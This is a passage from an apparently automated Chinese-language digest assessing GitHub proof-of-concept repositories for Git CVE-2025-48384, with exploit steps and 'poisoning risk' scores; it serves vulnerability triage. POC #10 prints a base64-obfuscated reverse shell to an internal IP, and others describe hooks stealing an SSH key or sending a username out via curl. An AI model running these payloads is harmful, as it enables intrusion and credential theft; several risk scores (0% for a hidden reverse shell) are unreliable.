该漏洞的投毒风险较低，主要原因是该POC利用方式比较直接，没有明显的混淆或隐藏恶意代码的行为。虽然攻击者可以修改子模块的内容以执行恶意操作，但这种行为很容易被发现。此外，由于该漏洞依赖于用户显式地使用`--recurse-submodules`选项，因此攻击者需要诱使用户执行此操作，增加了攻击的难度。总体而言，该POC的投毒风险较低，大约在10%左右。恶意代码主要体现在`post-checkout`钩子的利用上，若将代码修改为下载执行外部脚本，则投毒风险会升高。攻击者可以尝试使用一些简单的编码方式来混淆`post-checkout`脚本中的代码，例如base64编码或简单的异或操作，但这并不会显著增加投毒风险。通过分析该POC的代码，可以发现其主要依赖于Git的内置功能和标准库，没有使用任何可疑的第三方库或API。因此，可以认为该POC的投毒风险较低。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #5

**来源**: [CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md](../2025/CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 30%

## 详情

CVE-2025-48384是一个存在于Git中的任意文件写入漏洞。攻击者可以创建一个包含恶意的`.gitmodules`文件的Git仓库，当用户克隆这个仓库时，Git会自动初始化并配置子模块。恶意`.gitmodules`文件可以被构造来写入任意文件，从而导致远程代码执行。该漏洞的POC代码可在GitHub上找到，由liamg维护。该POC的有效性在于利用了Git子模块的特性，`.gitmodules`文件中指定的路径没有被充分过滤，从而允许写入仓库目录之外的文件。利用步骤如下：

1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者诱导用户克隆该仓库。
3. 当用户克隆仓库时，Git会自动处理`.gitmodules`文件，并尝试初始化和配置子模块。
4. 由于`.gitmodules`文件包含恶意配置，Git会将文件写入到指定的位置，从而导致任意文件写入。
5. 写入的文件可以包含shell脚本或其他可执行代码，从而允许攻击者执行任意命令。

根据搜索结果，Git官方已经发布了补丁来修复此漏洞。建议受影响的用户尽快更新到最新版本。

**投毒风险分析：**
此POC的投毒风险中等。虽然POC本身的代码比较简单，主要是创建一个恶意`.gitmodules`文件和一个简单的shell脚本，但是`.gitmodules`文件的恶意构造方式可能被用于隐藏更复杂的恶意代码。例如，攻击者可以将`.gitmodules`文件配置为从远程服务器下载并执行恶意脚本，或者将恶意代码嵌入到看似无害的文件中。此外，由于该漏洞涉及到Git仓库的克隆操作，攻击者可以通过社会工程学手段诱导用户克隆恶意仓库，从而扩大攻击范围。该POC脚本创建了`/tmp/CVE-2025-48384`文件，表明了其利用目标系统的能力。虽然这个行为本身是良性的PoC验证，但攻击者可以轻易替换成更具破坏性的操作。因此，需要警惕利用此漏洞进行投毒攻击的可能性，并采取相应的防御措施，例如对`.gitmodules`文件进行严格的校验和过滤，以及加强对Git仓库来源的审查。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #6

**来源**: [CVE-2025-48384-airkewld_cve-2025-48384-submodule.md](../2025/CVE-2025-48384-airkewld_cve-2025-48384-submodule.md)

## CVE-2025-48384-Git配置注入与RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的Git仓库，且安装的Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于Git在处理配置文件时的不一致性，具体来说，是Git在读取和写入包含控制字符（如回车符CR）的配置值时的方式存在差异。当初始化子模块时，如果子模块路径包含尾随CR，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块钩子目录，并且子模块包含一个可执行的post-checkout钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**

根据提供的漏洞利用代码，`post-checkout` 文件包含 shell 命令 `echo "RCE"` 和 `touch /tmp/rce.txt`。 该 POC 通过在恶意 Git 仓库中设置恶意的 `post-checkout` 钩子，当存在漏洞的 Git 客户端克隆包含该恶意仓库并递归初始化子模块时，就会触发该钩子，从而在目标系统上执行任意命令，验证 POC 的有效性。

**投毒风险分析：**

在提供的POC代码中，`README.md` 文件主要用于描述仓库，本身不包含恶意代码。`post-checkout` 文件中包含 `echo` 和 `touch` 命令，用于验证 RCE 是否成功。虽然这两个命令本身没有危害，但如果攻击者在 `post-checkout` 脚本中添加更复杂的恶意代码（例如下载并执行其他恶意程序），则可能存在投毒风险。评估当前代码，投毒风险较低，初步估计为10%。

**利用方式：**

1.  攻击者创建一个包含恶意配置和子模块的Git仓库。
2.  恶意配置包含带有尾随CR的子模块路径，该路径被符号链接指向`.git/hooks`目录。
3.  子模块包含一个名为 `post-checkout` 的可执行钩子，其中包含要执行的恶意代码。
4.  攻击者诱使用户克隆并递归初始化该仓库（例如，使用`git clone --recursive`）。
5.  当 Git 处理子模块时，由于配置处理的缺陷，恶意 `post-checkout` 钩子会被触发，导致在用户计算机上执行任意代码。

**优先级依据：**

在漏洞分析过程中，搜索引擎结果提供了漏洞的概况、影响、利用情况等信息，有助于全面了解漏洞。漏洞利用代码提供了直接的利用方法，有助于验证漏洞的有效性并深入理解漏洞原理。漏洞库信息提供了漏洞的官方描述和修复方案，有助于确认漏洞的存在和修复方法。综合考虑这些信息来源，可以更准确地评估漏洞的风险和利用方式。

**项目地址:** [airkewld/cve-2025-48384-submodule](https://github.com/airkewld/cve-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #7

**来源**: [CVE-2025-48384-altm4n_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-altm4n_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，并使用受影响的Git版本

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置值时，会去除尾部的回车换行符 (CRLF)。当写入配置条目时，如果值包含尾部的回车符 (CR)，则不会进行引号转义，导致在后续读取配置时丢失回车符。如果初始化子模块时，子模块路径包含尾部的回车符，则读取到的路径会被修改，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
提供的 POC 代码 `touch /tmp/xxxxxxx` 会在 `/tmp` 目录下创建一个名为 `xxxxxxx` 的文件。结合漏洞描述，这个 POC 代码本身并不能直接证明漏洞的存在，而是在攻击链中扮演了 *post-checkout* 钩子的角色，用于验证恶意配置是否能被执行。根据页面[5]（`https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384`）的信息，此漏洞涉及到使用`git clone --recursive`克隆包含恶意子模块的仓库，可以触发RCE。

**投毒风险：**
给定的 POC 代码非常简单，仅创建一个文件，没有发现隐藏的恶意代码。因此，投毒风险为 0%。这个脚本的目的是验证 post-checkout 钩子是否被触发，而不是执行恶意操作。但是如果恶意攻击者控制了git仓库，可以植入任意的post-checkout脚本实现远端代码执行.

**利用方式：**
1.  **创建恶意仓库：** 攻击者创建一个包含恶意配置的 Git 仓库。这个恶意配置包括一个带有尾部回车符的子模块路径，以及一个指向子模块 hooks 目录的符号链接。
2.  **添加恶意钩子：** 在子模块的 hooks 目录中，攻击者添加一个可执行的 post-checkout 钩子。这个钩子可以执行任意代码。
3.  **诱导用户克隆：** 攻击者诱导用户使用受影响的 Git 版本克隆这个恶意仓库，使用 `git clone --recursive` 命令递归克隆子模块。
4.  **触发漏洞：** 当 Git 初始化子模块时，由于配置处理的缺陷，子模块会被检出到错误的位置，触发符号链接，最终导致恶意 post-checkout 钩子被执行，实现任意代码执行。

**总结：**
此漏洞利用依赖于特定的 Git 配置和用户交互（克隆恶意仓库），攻击复杂度较高，但一旦成功利用，危害极大，可能导致服务器被完全控制。

**项目地址:** [altm4n/CVE-2025-48384-sub](https://github.com/altm4n/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #8

**来源**: [CVE-2025-48384-altm4n_cve-2025-48384-hub.md](../2025/CVE-2025-48384-altm4n_cve-2025-48384-hub.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 未知

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 30%

## 详情

CVE-2025-48384是一个存在于Git中的任意文件写入漏洞。该漏洞允许攻击者通过创建恶意的Git仓库，并在用户克隆该仓库时，在用户系统上写入任意文件，从而可能导致远程代码执行。该漏洞的根源在于Git处理submodule的方式存在缺陷，当.gitmodules文件包含恶意配置时，Git可能会在不进行充分验证的情况下写入文件。 

POC有效性分析：

根据搜索结果和提供的POC代码，该漏洞的POC已经存在，并且在GitHub上可以找到相应的代码。通过分析POC代码，可以确认该漏洞是可利用的。POC代码展示了一个简单的bash脚本，该脚本在受害者机器上建立反向shell连接到攻击者的IP地址。要验证该POC的有效性，需要搭建一个Git服务器，创建一个包含恶意.gitmodules文件的仓库，然后尝试在受害者机器上克隆该仓库。如果成功建立了反向shell连接，则说明该漏洞是可利用的。

利用步骤：
1. 攻击者创建一个包含恶意.gitmodules文件的Git仓库。
2. 攻击者诱骗受害者克隆该仓库。
3. 受害者克隆仓库时，Git会解析.gitmodules文件。
4. 由于.gitmodules文件包含恶意配置，Git会在受害者系统上写入任意文件，从而导致代码执行。
5. 在给定的POC中，恶意.gitmodules配置会导致执行`post-checkout`脚本，此脚本会创建一个反向shell连接到攻击者的机器。

投毒风险分析：
该POC的投毒风险属于中等水平。尽管提供的POC代码本身看起来比较简单，只是建立了一个反向shell连接，但是攻击者可以很容易地修改POC代码，使其执行更具破坏性的操作，例如删除文件、安装恶意软件或窃取敏感数据。此外，攻击者还可以通过代码混淆等技术来隐藏恶意代码，从而增加检测的难度。由于该漏洞涉及到Git仓库的克隆操作，攻击者可以通过社会工程学等手段来诱骗用户克隆恶意仓库，从而扩大攻击范围。例如，攻击者可以在GitHub等代码托管平台上发布包含恶意.gitmodules文件的项目，并诱导其他用户克隆这些项目。此外，如果攻击者能够控制目标组织的内部Git服务器，那么他们就可以更加容易地发起攻击。因此，需要对该漏洞保持警惕，并采取相应的安全措施来防范潜在的攻击。

由于POC本身包含网络连接行为，有一定的投毒风险。攻击者可能通过替换反向shell的IP地址，将受害者连接到恶意服务器，或者在反向shell中执行恶意指令。 混淆代码或添加额外的恶意功能也可能增加投毒风险。该POC的投毒风险评估为30%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #9

**来源**: [CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md](../2025/CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules仓库

**POC 可用性:** 7/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 40%

## 详情

CVE-2025-48384是一个Git中的任意文件写入漏洞。攻击者可以创建一个恶意的Git仓库，当用户克隆这个仓库时，恶意文件会被写入到用户的文件系统中，从而可能导致远程代码执行。

POC有效性分析：
根据搜索结果和POC代码，这个漏洞与`.gitmodules`文件的处理方式有关。攻击者可以在`.gitmodules`文件中嵌入恶意配置，当用户克隆包含这个文件的仓库时，Git客户端会解析这个文件，并执行其中的恶意操作。POC代码`post-checkout`中包含一个`curl`命令，该命令尝试向一个外部服务器发送包含用户名的请求，证明POC可以执行恶意命令。POC代码中包含了一个简单的利用场景，即在`post-checkout`脚本中执行curl命令，但这只是一个概念验证，攻击者可以利用这个漏洞执行更复杂的操作，例如写入恶意文件、修改系统配置等。 通过分析 liamg/CVE-2025-48384 项目，该项目提供了 PoC，表明该漏洞确实存在且可被利用，进一步验证了该漏洞的有效性。结合Arctic Wolf的报告，该漏洞的严重性被确认为高危，需要及时修复。

利用步骤：
1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者将这个仓库托管到一个公开的Git服务器上，或者通过其他方式诱使用户克隆这个仓库。
3. 用户克隆这个仓库。
4. Git客户端解析`.gitmodules`文件，并执行其中的恶意操作。
5. 恶意文件被写入到用户的文件系统中，或者其他恶意操作被执行。

投毒风险分析：
这个POC的投毒风险属于中等。虽然POC代码本身比较简单，只包含一个curl命令，但是攻击者可以很容易地将这个POC扩展到更复杂的攻击场景。例如，攻击者可以在`.gitmodules`文件中嵌入更复杂的脚本，或者利用这个漏洞下载并执行恶意文件。另外，由于这个漏洞涉及到Git客户端的解析过程，攻击者还可以利用这个漏洞绕过一些安全防护机制。在这个特定的POC中，存在一个对外部URL的curl请求。虽然这个请求本身并不一定是恶意的，但它可能会泄露用户信息，或者被用于恶意目的。如果这个请求的目标服务器被攻击者控制，那么攻击者就可以利用这个请求来执行更复杂的攻击。
此外，由于POC发布在公共代码托管平台，存在被恶意修改的风险，例如植入后门、添加恶意依赖等。用户在使用POC时需要仔细审查代码，确保其安全性。
综合考虑，这个POC的投毒风险为40%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-483


---

## POC #10

**来源**: [CVE-2025-48384-bummie_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-bummie_CVE-2025-48384-submodule.md)

## CVE-2025-48384-git-代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，且git版本在受影响范围内。用户需要进行交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384漏洞是由于Git在处理配置文件时，对换行符(
)处理不当造成的。当Git读取配置值时，会删除任何尾部的回车换行符(CRLF)。当写入配置条目时，带有尾部CR的值不会被引用，导致稍后读取配置时CR丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，该符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的仓库，该文件中的子模块路径包含尾部CR字符。
2.  攻击者创建一个符号链接，将修改后的路径（由于CR被移除）指向`.git/modules/<submodule_name>/hooks` 目录。
3.  攻击者在子模块中添加一个恶意的`post-checkout` 钩子，该钩子包含要执行的恶意代码。
4.  受害者克隆恶意仓库并初始化子模块。
5.  当子模块被检出时，由于符号链接的存在，恶意的`post-checkout` 钩子会被执行，导致任意代码执行。

**POC分析：**

提供的POC包含以下文件：

*   `README.md`：指向 GitHub 上的漏洞信息。
*   `post-checkout`：包含恶意代码的钩子脚本。

`post-checkout`脚本内容分析：

```bash
echo "yeet" > /tmp/pwn.txt
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTI4LjUuMzkvNDQ0NCAwPiYxKSAm|base64 -d|bash
```

*   该脚本首先创建一个文件`/tmp/pwn.txt`，内容为"yeet"，作为漏洞成功利用的标识。
*   然后，它使用`base64 -d`解码一段base64编码的字符串，并通过`bash`执行解码后的字符串。这段字符串实际上是一个反向shell连接到`10.128.5.39:4444`。

**有效性：**

提供的POC代码是有效的，如果目标机器满足漏洞利用的条件，则可以成功执行任意代码。

**投毒风险：**

提供的代码本身就是漏洞利用代码，旨在建立反向shell。虽然它本身不是隐藏的投毒代码，但如果用户不理解代码的含义就执行，那么对于用户来说，这就是恶意的。由于该代码已经明确展示了其恶意行为(反向shell)，因此**投毒风险为0%**。


**项目地址:** [bummie/CVE-2025-48384-submodule](https://github.com/bummie/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #11

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户执行递归克隆包含恶意.gitmodules文件的不受信任的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造恶意的.gitmodules文件和post-checkout钩子执行任意代码。该漏洞源于Git在处理带有回车符的配置值时存在差异，导致 submodule 被检出到错误的位置。如果攻击者在 submodule hooks 目录中放置一个符号链接，指向一个包含可执行的 post-checkout 钩子的子模块，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 post-checkout 钩子，它会在 `/tmp/exploited` 目录下创建一个文件。如果目标系统存在此漏洞并且成功利用，那么这个文件将被创建，表明漏洞利用成功。因此，该POC代码对于验证漏洞的存在是有效的。

**投毒风险：**

提供的POC代码本身非常简单，只是创建了一个文件。没有迹象表明代码中存在隐藏的恶意功能，因此投毒风险为0%。但是，这并不意味着包含此POC的仓库没有投毒风险。攻击者可能会在仓库的其他部分添加恶意代码，或者修改其他钩子来执行恶意操作。

**利用方式：**

漏洞利用方式如下：

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库。该文件包含带有尾随回车符的submodule路径。
2.  攻击者在submodule hooks目录中创建一个符号链接，将更改后的路径指向包含恶意 post-checkout 钩子的子模块。
3.  攻击者诱使用户递归克隆该仓库 (`git clone --recursive <repository_url>`)。
4.  当 Git 初始化 submodule 时，由于回车符处理不一致，submodule 会被检出到错误的位置。
5.  由于符号链接的存在，恶意的 post-checkout 钩子会被执行，导致任意代码执行。

总而言之，这是一个客户端漏洞，需要用户执行特定的操作才能被利用。攻击者需要诱使用户克隆包含恶意配置的仓库，并且用户需要使用受影响的 Git 版本。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC-Part2](https://github.com/butyraldehyde/CVE-2025-48384-PoC-Part2)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #12

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md)

## CVE-2025-48384-Git配置注入导致RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/RCE

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要clone包含恶意配置的git仓库（特别是包含submodule的仓库），并递归更新submodule。需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞是由于 Git 在处理包含回车符（CR）的配置值时存在不一致的行为导致的。具体来说，Git在读取配置值时会移除尾部的CRLF，但在写入配置时，如果值以CR结尾，则不会进行引号包裹，这会导致在后续读取时CR被截断。利用此漏洞，攻击者可以通过构造包含恶意配置的 `.gitmodules` 文件，当用户递归克隆包含 submodule 的仓库时，submodule会被检出到错误的位置。如果错误的位置存在一个指向 submodule 钩子目录的符号链接，并且 submodule 中包含一个可执行的 post-checkout 钩子，那么该钩子脚本可能在检出后被意外执行，从而导致远程代码执行 (RCE)。

**有效性：** 提供的 POC 代码 `/tmp/81eebc7f5ed9915ea7ef755075778acd/README.md` 看起来只是一个 README 文件，用于描述该漏洞。单凭这个文件本身无法直接触发漏洞，但可以作为漏洞利用的一部分，例如提供一个包含恶意`.gitmodules`文件的仓库。因此，提供的 PoC 代码本身无效，需要配合其他恶意文件才能完成漏洞利用。

**投毒风险：** 虽然提供的 PoC 仅仅是一个 README 文件，没有任何可疑代码。但是考虑到攻击者可能会在整个恶意Git仓库的其他位置，比如 `.gitmodules` 文件，或者 submodule 的 post-checkout 钩子中隐藏恶意代码。 考虑到这个漏洞需要恶意git仓库才能触发，因此存在一定的投毒风险，风险占比10%。

**利用方式：**

1.  **创建恶意 Git 仓库：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2.  **注入恶意配置：** 在 `.gitmodules` 文件中，攻击者设置 submodule 的路径，并在路径末尾包含一个回车符（CR）。此路径会被 Git 处理错误，导致 submodule 被检出到非预期的位置。
3.  **创建符号链接：** 攻击者在仓库中创建一个符号链接，将错误的 submodule 路径指向 `.git/modules/<submodule>/hooks` 目录。
4.  **添加恶意钩子：** 攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户克隆：** 攻击者诱骗用户递归克隆（`git clone --recursive`）恶意仓库。
6.  **触发 RCE：** 当用户执行 `git submodule update --init --recursive` 命令或类似的命令初始化 submodule 时，由于配置处理错误和符号链接的存在，恶意 post-checkout 钩子脚本会被执行，从而导致 RCE。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC](https://github.com/butyraldehyde/CVE-2025-48384-PoC)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #13

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-main.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-main.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致服务器被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库或初始化包含恶意配置的子模块），且Git版本在受影响范围内

**POC 可用性:** 是，但提供的POC不完整

**投毒风险:** 10%

## 详情

该漏洞源于Git处理配置中的引号不当，特别是在子模块初始化时。攻击者可以构造包含恶意配置的Git仓库，该配置在子模块路径中包含尾随的回车符（CR）。当Git读取这个配置时，会错误地解析子模块路径，导致子模块被检出到错误的位置。如果存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，那么该钩子可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**
提供的POC代码 `/tmp/bf064e338662304d3b4aa41ca61a0b1a/README.md`  只包含一个简单的markdown文件，无法直接证明漏洞的有效性。 它只是一个 README 文件，用来描述或者记录一些信息,不能用来验证漏洞的有效性。缺少必要的利用步骤，例如：构造恶意仓库，包含特殊字符的子模块路径，和可执行的 post-checkout 钩子。

**投毒风险分析：**
提供的POC代码只包含一个README文件，投毒风险较低，但也不能完全排除作者在其他文件或分支中隐藏恶意代码的可能性。假设该作者还有其他的commit/branch，有投毒的可能性，所以投毒风险评估为10%。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置的核心是子模块路径，其中包含一个尾随的回车符（CR）。
3.  攻击者创建一个符号链接，将错误的子模块路径指向子模块的钩子目录（.git/hooks）。
4.  恶意仓库包含一个子模块，其中包含一个可执行的 post-checkout 钩子脚本。
5.  受害者克隆恶意仓库或初始化包含恶意配置的子模块。
6.  Git解析错误路径，将子模块检出到错误位置，并触发符号链接。
7.  post-checkout 钩子脚本被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-main](https://github.com/ceevase/CVE-2025-48384-main)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #14

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户检出包含恶意配置的Git仓库，且目标Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞源于Git在处理配置文件时的不当引用。攻击者可以通过在 submodule 的路径中注入回车符（CR），导致 Git 将 submodule 检出到错误的位置。如果攻击者精心构造一个符号链接，将这个错误的位置指向 `.git/hooks` 目录，并且 submodule 中包含一个可执行的 `post-checkout` 钩子，那么在检出 submodule 后，这个钩子就会被执行，从而实现任意代码执行。

**POC有效性：** 提供的POC代码包含一个 `post-checkout` 钩子脚本，该脚本会将 `/home/gamma/.ssh/id_ed25519` 的内容复制到 `/tmp/recipes.txt`。这个脚本本身可以成功运行，并达到预期的效果，因此POC有效。

**投毒风险：** 从提供的POC代码来看，没有发现明显的恶意投毒行为。该POC主要演示了漏洞的利用方式，即通过执行 `post-checkout` 钩子来窃取SSH私钥。因此，投毒风险评估为0%。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该仓库中的 submodule 路径包含一个尾随回车符。
2.  攻击者创建一个符号链接，将错误的 submodule 检出位置指向 `.git/hooks` 目录。
3.  攻击者在 submodule 中添加一个可执行的 `post-checkout` 钩子，该钩子包含恶意代码。
4.  攻击者诱骗受害者检出该Git仓库。
5.  受害者检出 submodule 时，由于配置解析错误，submodule 会被检出到错误的位置，从而触发符号链接，使得 `.git/hooks/post-checkout` 钩子被执行。
6.  恶意代码被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-sub](https://github.com/ceevase/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #15

**来源**: [CVE-2025-48384-eliox01_CVE-2025-48384.md](../2025/CVE-2025-48384-eliox01_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待确定，参考GitHub advisory

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-48384是一个影响Git的任意文件写入漏洞。攻击者可以创建一个恶意的Git仓库，当受害者克隆这个仓库时，恶意配置会导致任意文件写入。根据搜索结果，该漏洞存在于Git的 submodule 处理过程中，攻击者可以利用包含恶意.gitmodules文件的仓库，在受害者克隆仓库时执行恶意操作。

POC有效性分析：
根据提供的搜索结果和POC代码库（liamg/CVE-2025-48384），该漏洞具有较高的可利用性。POC代码库提供了可执行的PoC，证明该漏洞确实存在。通过精心构造的.gitmodules文件，攻击者可以控制git submodule的配置，导致任意文件写入。

利用步骤：
1. 攻击者创建一个包含恶意.gitmodules文件的Git仓库。
2. 攻击者诱使受害者克隆该仓库（例如，通过社交工程或将其托管在公共代码托管平台上）。
3. 当受害者执行git clone --recurse-submodules或git submodule update命令时，Git会解析.gitmodules文件，并执行其中包含的恶意配置。
